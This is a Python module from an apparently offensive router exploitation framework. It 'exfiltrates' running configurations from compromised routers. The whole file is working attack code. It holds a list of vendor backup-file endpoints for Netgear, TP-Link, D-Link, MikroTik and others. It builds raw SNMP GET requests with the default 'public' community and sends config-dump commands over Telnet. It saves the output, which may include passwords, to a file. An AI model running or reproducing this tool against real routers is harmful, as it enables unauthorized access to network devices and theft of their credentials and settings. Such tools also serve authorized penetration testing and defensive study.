# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""Router running configuration exfiltration module.

Exfiltrates the full running configuration from compromised routers using
multiple extraction methods: HTTP backup download, SNMP running-config
retrieval, and CLI command execution (show running-config, export).

Saves extracted configuration to a local file for offline analysis.

MITRE ATT&CK: T1005 (Data from Local System), T1039 (Data from Network Shared Drive)
References:
  - https://attack.mitre.org/techniques/T1005/
  - https://attack.mitre.org/techniques/T1039/

Version: 1.0.0
"""
from __future__ import annotations

import os
import re
import socket
import struct
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple

from embedxpl.core.exploit import (

    OptIP,
    OptPort,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_table,
    print_warning,
)
# HTTP backup endpoints common on SOHO routers
_HTTP_BACKUP_PATHS: List[Tuple[str, str]] = [
    # Netgear
    ("/cgi-bin/config_backup.cgi", "Netgear config backup CGI"),
    ("/NETGEAR_DGN2200.cfg", "Netgear DGN2200 config file"),
    # TP-Link
    ("/cgi/conf.bin", "TP-Link binary config"),
    ("/romfile.cfg", "TP-Link romfile config"),
    # D-Link
    ("/config.bin", "D-Link config backup"),
    ("/ncc/backup/backupSettings.conf", "D-Link settings backup"),
    # Asus
    ("/Settings", "ASUS settings download"),
    ("/settings.cfg", "ASUS config file"),
    # MikroTik
    ("/export", "MikroTik export"),
    ("/backup.backup", "MikroTik backup file"),
    # ZyXEL
    ("/cgi-bin/export_backup.cgi", "ZyXEL config export"),
    # Linksys/Cisco Small Business
    ("/config.cfg", "Generic config file"),
    ("/running-config", "Running config (HTTP API)"),
    # OpenWrt/LEDE LuCI
    ("/cgi-bin/luci/admin/system/backup", "OpenWrt LuCI backup"),
    # Generic
    ("/backup.cfg", "Generic backup config"),
    ("/startup-config", "Startup config endpoint"),
]

# CLI commands for different router types
_CLI_COMMANDS: Dict[str, List[str]] = {
    "cisco_ios": [
        "show running-config",
        "show startup-config",
        "show version",
        "show ip interface brief",
        "show ip route",
        "show access-lists",
    ],
    "mikrotik": [
        "/export",
        "/system identity print",
        "/ip address print",
        "/ip firewall filter print",
        "/ip route print",
        "/interface print",
    ],
    "openwrt": [
        "uci export",
        "cat /etc/config/network",
        "cat /etc/config/wireless",
        "cat /etc/config/firewall",
        "cat /etc/config/dhcp",
        "ip addr show",
    ],
    "vyos": [
        "show configuration",
        "show configuration commands",
        "show interfaces",
        "show ip route",
        "show firewall",
    ],
    "generic": [
        "show running-config",
        "show config",
        "cat /etc/config/*",
        "ifconfig -a",
        "ip addr show",
        "iptables -L -n -v",
        "netstat -tlnp",
    ],
}

# SNMP OIDs for configuration retrieval
_SNMP_CONFIG_OIDS = {
    "sysDescr": "1.3.6.1.2.1.1.1.0",
    "sysName": "1.3.6.1.2.1.1.5.0",
    "sysLocation": "1.3.6.1.2.1.1.6.0",
    "sysContact": "1.3.6.1.2.1.1.4.0",
    "ifTable": "1.3.6.1.2.1.2.2",
    "ipAddrTable": "1.3.6.1.2.1.4.20",
    "ipRouteTable": "1.3.6.1.2.1.4.21",
}
class Exploit:
    """Router Running Configuration Exfiltrator.

    Exfiltrates router running configuration via HTTP backup download,
    SNMP queries, or CLI command execution. Supports Cisco IOS, MikroTik,
    OpenWrt, VyOS, and generic embedded routers.

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Router Config Exfiltrator",
        "description": (
            "Exfiltrates running configuration from compromised routers. "
            "Methods: HTTP backup download, SNMP running-config retrieval, "
            "CLI command execution. MITRE: T1005, T1039."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://attack.mitre.org/techniques/T1005/",
            "https://attack.mitre.org/techniques/T1039/",
            "https://www.cisco.com/c/en/us/td/docs/ios/fundamentals/command/reference/cf_book.html",
        ),
        "devices": (
            "Cisco IOS routers",
            "MikroTik RouterOS",
            "OpenWrt/LEDE routers",
            "VyOS routers",
            "Netgear/TP-Link/D-Link SOHO routers",
            "Generic embedded routers",
        ),
    }

    target = OptIP("", "Target router IPv4 or IPv6 address")
    port = OptPort(80, "Target port (HTTP: 80/443, SNMP: 161, CLI: 22/23)")
    method = OptString("http", "Extraction method: http, snmp, or cli")
    output_file = OptString("", "Output file path (auto-generated if empty)")
    community = OptString("public", "SNMP community string (for snmp method)")

    def run(self) -> None:
        """Execute configuration exfiltration."""
        method = str(self.method).lower().strip()
        if method not in ("http", "snmp", "cli"):
            print_error("Invalid method '{}'. Use: http, snmp, or cli.".format(method))
            return

        print_status("Config exfiltration from {} via {} method".format(self.target, method))

        config_data = ""

        if method == "http":
            config_data = self._exfil_http()
        elif method == "snmp":
            config_data = self._exfil_snmp()
        elif method == "cli":
            config_data = self._exfil_cli()

        if not config_data:
            print_error("No configuration data retrieved from {}".format(self.target))
            return

        # Determine output path
        out_path = str(self.output_file).strip()
        if not out_path:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_ip = str(self.target).replace(":", "_").replace(".", "_")
            out_path = "router_config_{}_{}.txt".format(safe_ip, timestamp)

        # Write config to file
        try:
            with open(out_path, "w") as f:
                f.write("# Router Configuration Dump\n")
                f.write("# Target: {}:{}\n".format(self.target, self.port))
                f.write("# Method: {}\n".format(method))
                f.write("# Date: {}\n".format(datetime.now().isoformat()))
                f.write("# Tool: EmbedXPL-Forge / Router Config Exfiltrator\n")
                f.write("#" + "=" * 70 + "\n\n")
                f.write(config_data)

            file_size = os.path.getsize(out_path)
            print_success("Configuration saved to: {} ({} bytes)".format(out_path, file_size))
        except OSError as exc:
            print_error("Failed to write output file: {}".format(exc))

    def _exfil_http(self) -> str:
        """Exfiltrate config via HTTP backup endpoints."""
        print_info("Trying {} HTTP backup endpoints...".format(len(_HTTP_BACKUP_PATHS)))
        results: List[str] = []

        for path, description in _HTTP_BACKUP_PATHS:
            print_info("  Trying: {} ({})".format(path, description))
            response = self._http_get(path)
            if response and self._is_config_data(response):
                print_success("  Config found at: {}".format(path))
                results.append("# Source: HTTP {} ({})\n{}\n".format(path, description, response))

        if not results:
            # Try with HTTPS on port 443
            if int(self.port) != 443:
                print_info("Retrying on HTTPS port 443...")
                original_port = self.port
                self.port = 443
                for path, description in _HTTP_BACKUP_PATHS[:5]:
                    response = self._http_get(path, use_https=True)
                    if response and self._is_config_data(response):
                        print_success("  Config found at: {} (HTTPS)".format(path))
                        results.append("# Source: HTTPS {}\n{}\n".format(path, response))
                self.port = original_port

        return "\n".join(results)

    def _exfil_snmp(self) -> str:
        """Exfiltrate configuration data via SNMP GET requests."""
        print_info("SNMP configuration retrieval using community: '{}'".format(self.community))
        results: List[str] = []

        for name, oid in _SNMP_CONFIG_OIDS.items():
            print_info("  Querying: {} ({})".format(name, oid))
            value = self._snmp_get(oid)
            if value:
                results.append("{}: {}".format(name, value))
                print_success("  {}: {}".format(name, value[:80]))

        if results:
            return "\n".join(results)
        return ""

    def _exfil_cli(self) -> str:
        """Exfiltrate config via CLI commands over Telnet/SSH."""
        print_info("CLI config extraction via Telnet on port {}".format(self.port))
        results: List[str] = []

        sock = self._connect()
        if sock is None:
            print_error("Cannot connect to {}:{}".format(self.target, self.port))
            return ""

        try:
            # Try to detect router type from banner
            banner = self._recv_data(sock, timeout=3)
            banner_text = banner.decode("utf-8", errors="replace")
            router_type = self._detect_router_type(banner_text)
            print_info("Detected router type: {}".format(router_type))

            commands = _CLI_COMMANDS.get(router_type, _CLI_COMMANDS["generic"])

            # Send newline to get to prompt
            sock.sendall(b"\r\n")
            time.sleep(0.5)
            self._recv_data(sock, timeout=2)

            for cmd in commands:
                print_info("  Executing: {}".format(cmd))
                output = self._exec_cli_command(sock, cmd)
                if output and output.strip():
                    results.append("# Command: {}\n{}\n".format(cmd, output))

        finally:
            try:
                sock.close()
            except Exception:
                pass

        return "\n".join(results)

    def _http_get(self, path: str, use_https: bool = False) -> str:
        """Perform a raw HTTP GET request."""
        try:
            port = int(self.port)
            sock = socket.create_connection((str(self.target), port), timeout=8)

            if use_https:
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=str(self.target))

            request = (
                "GET {} HTTP/1.1\r\n"
                "Host: {}\r\n"
                "User-Agent: Mozilla/5.0\r\n"
                "Connection: close\r\n"
                "\r\n"
            ).format(path, self.target)

            sock.sendall(request.encode())

            response = b""
            while True:
                try:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 5 * 1024 * 1024:  # 5MB limit
                        break
                except socket.timeout:
                    break

            sock.close()

            decoded = response.decode("utf-8", errors="replace")

            # Check HTTP status
            if decoded.startswith("HTTP/"):
                status_line = decoded.split("\r\n", 1)[0]
                if " 200 " not in status_line and " 301 " not in status_line:
                    return ""

                # Separate headers from body
                header_end = decoded.find("\r\n\r\n")
                if header_end >= 0:
                    return decoded[header_end + 4:]

            return decoded

        except (OSError, socket.error):
            return ""

    def _snmp_get(self, oid: str) -> str:
        """Perform a basic SNMPv1/v2c GET request via raw UDP.

        Builds a minimal ASN.1/BER-encoded SNMP GetRequest packet.
        """
        try:
            # Build SNMP v1 GET request manually
            community_bytes = str(self.community).encode()
            oid_parts = [int(x) for x in oid.split(".")]

            # Encode OID
            oid_encoded = self._encode_oid(oid_parts)

            # Build varbind: SEQUENCE { OID, NULL }
            varbind = self._asn1_sequence(oid_encoded + b"\x05\x00")
            varbind_list = self._asn1_sequence(varbind)

            # Build PDU: GetRequest-PDU [0]
            request_id = struct.pack(">I", int(time.time()) & 0xFFFFFFFF)
            pdu_body = (
                self._asn1_integer(request_id)  # request-id
                + self._asn1_integer(b"\x00")   # error-status
                + self._asn1_integer(b"\x00")   # error-index
                + varbind_list
            )
            pdu = bytes([0xA0]) + self._asn1_length(len(pdu_body)) + pdu_body

            # Build SNMP message
            message_body = (
                self._asn1_integer(b"\x00")   # version: SNMPv1 (0)
                + self._asn1_octet_string(community_bytes)
                + pdu
            )
            packet = self._asn1_sequence(message_body)

            # Send via UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            target_port = int(self.port) if int(self.port) != 80 else 161
            sock.sendto(packet, (str(self.target), target_port))

            data, _ = sock.recvfrom(65535)
            sock.close()

            # Parse response: find the last OctetString value
            return self._extract_snmp_value(data)

        except (OSError, socket.error, struct.error):
            return ""

    def _encode_oid(self, parts: List[int]) -> bytes:
        """Encode an OID in ASN.1 BER format."""
        if len(parts) < 2:
            return b""

        encoded = bytes([parts[0] * 40 + parts[1]])
        for part in parts[2:]:
            if part < 128:
                encoded += bytes([part])
            else:
                # Multi-byte encoding
                octets = []
                val = part
                octets.append(val & 0x7F)
                val >>= 7
                while val:
                    octets.append((val & 0x7F) | 0x80)
                    val >>= 7
                encoded += bytes(reversed(octets))

        return bytes([0x06, len(encoded)]) + encoded

    def _asn1_sequence(self, data: bytes) -> bytes:
        """Wrap data in an ASN.1 SEQUENCE."""
        return b"\x30" + self._asn1_length(len(data)) + data

    def _asn1_integer(self, value: bytes) -> bytes:
        """Encode an ASN.1 INTEGER."""
        return b"\x02" + self._asn1_length(len(value)) + value

    def _asn1_octet_string(self, value: bytes) -> bytes:
        """Encode an ASN.1 OCTET STRING."""
        return b"\x04" + self._asn1_length(len(value)) + value

    def _asn1_length(self, length: int) -> bytes:
        """Encode ASN.1 BER length."""
        if length < 128:
            return bytes([length])
        octets = []
        val = length
        while val:
            octets.append(val & 0xFF)
            val >>= 8
        octets.reverse()
        return bytes([0x80 | len(octets)]) + bytes(octets)

    def _extract_snmp_value(self, data: bytes) -> str:
        """Extract the response value from an SNMP response packet."""
        try:
            # Look for OctetString (0x04) values in the response
            idx = 0
            last_value = ""
            while idx < len(data) - 2:
                if data[idx] == 0x04:  # OctetString
                    length = data[idx + 1]
                    if length < 128 and idx + 2 + length <= len(data):
                        value = data[idx + 2:idx + 2 + length]
                        decoded = value.decode("utf-8", errors="replace")
                        if decoded.isprintable() and len(decoded) > 1:
                            last_value = decoded
                    idx += 2 + (length if length < 128 else 1)
                else:
                    idx += 1
            return last_value
        except (IndexError, ValueError):
            return ""

    def _connect(self) -> Optional[socket.socket]:
        """Establish TCP connection."""
        try:
            sock = socket.create_connection(
                (str(self.target), int(self.port)),
                timeout=10,
            )
            sock.settimeout(8)
            return sock
        except (OSError, socket.error) as exc:
            print_error("Connection error: {}".format(exc))
            return None

    def _recv_data(self, sock: socket.socket, timeout: float = 3.0) -> bytes:
        """Receive available data with timeout."""
        data = b""
        end_time = time.monotonic() + timeout
        while time.monotonic() < end_time:
            remaining = end_time - time.monotonic()
            if remaining <= 0:
                break
            sock.settimeout(min(remaining, 1.0))
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                if data:
                    break
            except OSError:
                break
        return data

    def _detect_router_type(self, banner: str) -> str:
        """Detect router type from banner text."""
        banner_lower = banner.lower()
        if "cisco" in banner_lower or "ios" in banner_lower:
            return "cisco_ios"
        if "mikrotik" in banner_lower or "routeros" in banner_lower:
            return "mikrotik"
        if "openwrt" in banner_lower or "lede" in banner_lower:
            return "openwrt"
        if "vyos" in banner_lower or "vyatta" in banner_lower:
            return "vyos"
        return "generic"

    def _exec_cli_command(self, sock: socket.socket, cmd: str) -> str:
        """Execute a command and capture output."""
        try:
            sock.settimeout(0.5)
            try:
                sock.recv(4096)
            except socket.timeout:
                pass

            sock.sendall(cmd.encode() + b"\r\n")
            time.sleep(0.5)

            output = self._recv_data(sock, timeout=5)
            decoded = output.decode("utf-8", errors="replace")

            lines = decoded.splitlines()
            # Remove echoed command
            if lines and cmd in lines[0]:
                lines = lines[1:]
            # Remove trailing prompt
            if lines and re.match(r"^[\w\-@#$>]+\s*$", lines[-1]):
                lines = lines[:-1]

            return "\n".join(lines)
        except (OSError, socket.error):
            return ""

    def _is_config_data(self, data: str) -> bool:
        """Heuristic check if data looks like configuration content."""
        if len(data) < 20:
            return False

        config_indicators = [
            "interface", "ip address", "hostname", "password",
            "access-list", "route", "firewall", "network",
            "wireless", "ssid", "config", "option", "set ",
            "wan", "lan", "dhcp", "dns", "nat", "iptables",
        ]

        lower_data = data.lower()
        matches = sum(1 for ind in config_indicators if ind in lower_data)
        return matches >= 2

    def check(self) -> bool:
        """Check if target port is open."""
        try:
            sock = socket.create_connection(
                (str(self.target), int(self.port)),
                timeout=5,
            )
            sock.close()
            return True
        except (OSError, socket.error):
            return False
